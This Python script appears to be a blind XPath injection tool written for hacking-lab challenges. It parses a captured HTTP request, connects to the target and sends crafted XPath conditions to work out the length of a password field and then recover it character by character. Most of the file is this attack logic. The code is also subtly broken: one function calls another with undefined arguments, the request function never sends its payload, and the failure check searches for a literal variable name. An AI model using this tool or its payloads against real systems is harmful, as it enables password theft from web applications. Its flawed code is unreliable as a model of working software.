#!/usr/bin/python3

# Copyright (C) Zaphoxx
#
# This program is free software; you can redistribute it and/or modify it under
# the terms of the GNU General Public License version 2, as published by the
# Free Software Foundation
#
# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
# FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
# details (http://www.gnu.org/licenses/gpl.txt).

__author__  = 'zaphoxx'
__email__   = 'zaphoxx@gmail.com'
__url__     = ''
__git__     = 'not disclosed yet'
__twitter__ = ''
__version__ = '0.1a'
__license__ = 'GPLv2'
__banner__  =  '\t@@@  @@@ @@@@@@@  @@@\n\t@@!  !@@ @@!  @@@ @@!\n\t !@@!@!  @!@@!@!  !!@\n\t !: :!!  !!:      !!:\n\t:::  :::  :       :\tDebug Rabbit\n \
				\n[+] xpi {} ({}) by {}'.format(__version__,__author__, __git__)

__description__ =""
#README {{{
#
#}}}

import argparse
import http.client
import urllib.parse
import base64
import gzip
import re
import chitter

__gHeaderfieldsFile__="headerfields.txt"
__gHeaderFields__={}

# parameters to be modified by your needs
__gFail__="FAIL"
__gXparam__='passwd'
chitter.__gDebug__=False
chitter.__gInfo__=False

# do not modify parameters below
__gInclude__={}
__gExclude__=['debug']
__gUseCookie__=False
__gTestHeader__=True
__gHeader__={}
__gInputParameters__={}
__gRequestParameters__={}
__gCookies__={}



def main():
	
	chitter.post("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
	chitter.post("")
	chitter.post("{}".format(__banner__))
	chitter.post("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
	chitter.info(__description__)
	
	chitter.debug("TEST TEST TEST")

	# argument parser
	
	parser=argparse.ArgumentParser()
	args=initParser(parser)
	chitter.status("parse input parameters")
	# initialization / read in file with headerfield definitions
	chitter.status("read parameters from requestheader file '{}'".format(__gHeaderfieldsFile__))
	init()
	__gInputParameters__.update(handleArgs(args))
	updateHeaders(__gInputParameters__['headerfile'])

	# update
	for k in __gRequestParameters__.keys():
		if k!=__gXparam__ and not k in __gExclude__:
			__gInclude__.update({k:__gRequestParameters__[k]})

	try:
		for x in __gExclude__:
			del __gInclude__[x]
	except:
		pass

	__connection__=connectTarget()

	if __connection__!=None:
		if __gTestHeader__:
			testConnection(__connection__)
		else:
			getPwLength(__connection__)
	else:
		chitter.fatal("Connection could not be established!")
		exit(0)
	# dont forget to close __connection__
	__connection__.close()

def testConnection(connection):
	requestParameters=urllib.parse.urlencode(__gRequestParameters__)
	connection.request(__gInputParameters__['method'],__gInputParameters__['path'],requestParameters,__gHeader__)
	resp=connection.getresponse()
	chitter.status("[CONNECTION] {} - {}".format(resp.status,resp.reason))
	data=resp.read(100)
	try:
		data_out=gzip.decompress(data)
	except:
		data_out=data
		pass
	chitter.info(str(resp.status)+" | "+str(resp.reason))
	chitter.info("RESPONSE HEADERS")
	for key in resp.headers:
		chitter.info("\t"+key+" : "+resp.headers[key])
	chitter.info("BODY:\n\t")
	chitter.info("--------- BODY BEGIN ---------")
	chitter.info(data_out)
	chitter.info("--------- BODY END ---------")

def init():
	try:
		with open(__gHeaderfieldsFile__,'r') as hf:
			line=hf.readline()
			while (line!=""):
				field=line.strip('\n')
				__gHeaderFields__.update({field:''})
				line=hf.readline()
	except Exception as e:
		chitter.fatal("Could not read file with list of headerfields!")
		print(e)

def initParser(parser):
	#parser.add_argument("-i","--labId",metavar="\b",dest="labId",required=True,help="hacking-lab id - This refers to the server id from the created docker of the challenge.")
	parser.add_argument("-r","--request",metavar="\b",dest="headerfile",required=True,help="sample header request file")
	parser.add_argument("-x","--exclude",dest="exclude",required=False,default="",help="parameters to exclude from condition")
	parser.add_argument("--useCookie",dest="usecookie",action="store_true",help="switch to cookie injection")
	parser.add_argument("--test",dest="test",action="store_true",help="test header and connection")
	parser.add_argument("-v",dest="verbose",action="store_true",help="show additional information")
	parser.add_argument("--debug",dest="debug",action="store_true",help="show debug information")
	#parser.add_argument("-t","target",dest="target",help="optional manual target definition. Overrides labId values")
	parser.set_defaults(test=False,usecookie=False,verbose=False)
	args=parser.parse_args()
	return args

def readRequestHeader(line):

	(method,loc,h)=line.split(" ")
	h=h.strip('\n')
	chitter.info("\t[REQUEST] {} {} {}".format(method,loc,h))

	if(method!="POST" and method!="GET"):
		method=""
		loc=""
		h=""
	elif(method=="GET"):
		if loc.find("?")>-1:
			loc=re.sub(r'[\n ]*','',loc)
			(path,p)=loc.split("?")
			updateRequestParameters(p,"GET")
		else:
			path=loc #assuming path without request parameters
			chitter.warn("Did not find any RequestParameters in provided Header")
	elif(method=="POST"):
		path=loc
	__gInputParameters__.update({'method':method,'path':path})

def updateRequestParameters(s,method):
	if s.find('&')>-1:
		params=s.split("&")
		for v in params:
			(key,value)=v.split("=")
			__gRequestParameters__.update({key:value})
			chitter.debug("\t\t{} {}={}".format(method,key,value))
	else:
		(key,value)=s.split('=')
		__gRequestParameters__.update({key:value})
		chitter.debug("\t\t{} {}={}".format(method,key,value))

def updateCookies(v):
	v=urllib.parse.unquote_plus(v)
	if v.find(';')>-1:
		v=re.sub(r'[ ]*','',v)
		items=v.split(';')
		for i in items:
			(k,v)=i.split("=")
			__gCookies__.update({k:v})
			chitter.post("\t\t[Cookie] {} = {}".format(k,v) )
	else:
		v=re.sub(r'[ ]*','',v)
		(k,v)=v.split('=')
		chitter.post("\t\t[Cookie] {} = {}".format(k,v) )

def updateHeaders(__headerFile__):
	#method=""
	try:
		with open(__headerFile__,'r') as hf:
			chitter.info(" -----------------------------------------")
			chitter.info(" header request fields from header file:")
			for line in hf.readlines():
				sline=line.strip("\n")
				fieldFound=False
				for k,v in __gHeaderFields__.items():
					# only proceed if match is not followed by a '-' to avoid mixup e.g. for Accept vs. Accept-Encoding
					if sline.find(k)>-1 and sline[len(k)]!='-':
						v=sline[(sline.find(k)+len(k)):(len(sline)+1)]
						v=re.sub(r'^[:| #]*', '', v) #remove ':',' ','|' from the beginning
						__gHeader__.update({k:v})
						chitter.info("\t {}: {}".format(k,v))
						if(k=='Cookie'):
							updateCookies(v)
						fieldFound=True
						if(k=='Host'):
							__gInputParameters__.update({'target':v})
						break
				if(not fieldFound):
					if sline!="":
						if sline.find("GET")>-1 or sline.find("POST")>-1:
							readRequestHeader(line);

						else:
							if(__gInputParameters__['method']=="POST"):
								#sline=line.strip("\n")
								chitter.info("\t-----------------------------------------")
								chitter.info("\tPOST request parameters from header file:")
								updateRequestParameters(sline,"POST")
	except Exception as e:
		print("[!!!] Error in updateHeaders()!")
		print(e)

def setExclusions(string):
	exclusions=string.split(",")
	for e in exclusions:
		__gExclude__.append(e)

def handleArgs(args):
	# handle commandline arguments
	headerfile=args.headerfile
	__gTestHeader__=args.test
	chitter.__gDebug__=args.debug
	chitter.__gInfo__=args.verbose
	parameters={'headerfile':headerfile,
				'port':80}
	return parameters

def connectTarget():
	# connect to target
	try:
		chitter.status("Connect to target '{}'".format(__gInputParameters__['target']))
		connection = http.client.HTTPConnection(__gInputParameters__['target'],__gInputParameters__['port'])
	except Exception as e1:
		chitter.fatal("Could not establish connection in function connectTarget()!")
		try:
			connection.close()
		except Exception as e2:
			chitter.fatal("Could not close connection in function connectTarget()!")
			exit(0)

	return connection

# xParam is the parameter used for xpath injection
def buildPayloadForLength(index):
	payload=""
	condition=""
	for p in __gInclude__.keys():
		if condition=="":
			condition+="{}='{}'".format(p,__gInclude__[p])
		else:
			condition+=" and {}='{}'".format(p,__gInclude__[p])
	payload="{}=x' and string-length(self::*[{}])={} and '1'='1".format(__gXparam__,condition,index)
	return urllib.parse.quote_plus(payload)

def buildPayloadForName(character,index):
	payload=""
	condition=""
	for p in __gInclude__.keys():
		if condition=="":
			condition+="'{}'".format(p,__gInclude__[p])
		else:
			condition+=" and {}='{}'".format(p,__gInclude__[p])

	payload="{}=x' and substring(self::*[{}],{},1)='{}".format(__gXparam__,condition,index,character)
	return urllib.parse.quote_plus(payload)

def getPwLength(connection):
	pwLength=-1
	n=0
	for n in range(1,31):
		payload=buildPayloadForLength(n)
		if not requestFailed(payload,connection):
			chitter.info(" payload: {}".format(payload))
			pwLength=n
			break

	print("[+++] password length = {} characters wide.".format(pwLength))
	return pwLength

def getPw(connection):
	pw=""
	c=32
	pwLength=getPwLength(header,inputParameters,requestParameters)
	if pwLength>-1:
		for n in range(1,pwLength+1):
			c=32
			for c in range(32,128):
				payload=buildPayloadForName(chr(c),n)
				if not requestFailed(payload,connection):
					chitter.info(" payload: {}".format(payload))
					pw+=chr(c)
					chitter.info(" pw={}".format(pw))
					break
	else:
		print("[-] Password retrievel failed. Password length could not be determined!")

	print("[+++ FOUND +++] password = {}".format(pw))

def requestFailed(payload,connection):
	fail=True
	requestParameters=urllib.parse.urlencode(__gRequestParameters__)

	connection.request(__gInputParameters__['method'],__gInputParameters__['path'],requestParameters,__gHeader__)
	resp=connection.getresponse()
	print("[CONNECTION] {} - {}".format(resp.status,resp.reason))
	data=resp.read()

	try:
		data=gzip.decompress(data)
	except:
		pass
	# --------- delete content below this line -----------
	#if str(data).find("shiny")>-1:
	#	fail=False
	# --------- delete content above this line -----------
	print(data)
	if str(data).find("__gFail__")>-1:
		fail=True
	else:
		fail=False
	'''
	except Exception as e:
		print("[!!!] Error in function requestFailed()!")
		print(e)
	'''
	return fail

if __name__=="__main__":
	main()
